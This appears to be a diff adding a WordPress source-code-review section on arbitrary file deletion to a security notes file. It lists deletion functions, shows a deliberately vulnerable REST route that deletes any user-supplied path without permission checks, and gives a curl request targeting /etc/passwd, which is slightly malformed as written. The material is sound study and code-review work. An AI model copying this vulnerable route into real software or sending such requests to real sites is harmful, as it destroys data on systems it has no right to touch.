@@ -2622,7 +2622,57 @@ EOF
 
 -----------------------
 
+### Source Code Review-> Wordpress
 
+----------------------
+
+- Arbitrary file deletion-:It occurs when an attacker is able to delete files.Devs should always use the `sanitize_file_name` function to sanitize file name.Useful functions-:
+
+- PHP_Related-:
+
+```
+unlink()
+rmdir()
+```
+
+- Wordpress related-:
+
+```
+wp_delete_file
+wp_delete_from_directory
+WP_Filesystem_Direct::delete
+Wp_Filesystem_Direct::rmdir
+```
+
+- Vulnerable code snippet-:
+
+```php
+add_action("init", "rest_init_setup");
+
+function rest_init_setup(){
+    register_rest_route( "myplugin/v1", '/deletemedia/', array(
+        'methods'                   =>  "POST",
+        'callback'                  =>  'delete_media_upload',
+        'permission_callback' => '__return_true',
+    ) );
+}
+
+function delete_media_upload($request){
+    $args = json_decode($request->get_body(),true);
+    $data = array('status'=>false);
+    if(!empty($args['media']) ){
+        wp_delete_file( $args['media']['file'] ); //Vulnerable function
+        $data = array('status'=>true);
+    }
+    return new WP_REST_Response( $data, 200 );
+}
+```
+
+- Exploit with curl-:
+
+```bash
+curl -u <url>/myplugin/v1/deletemedia -H "Content-Type: application/json" -d '{"media":{"file":"/etc/passwd"}'
+```
 
 
 
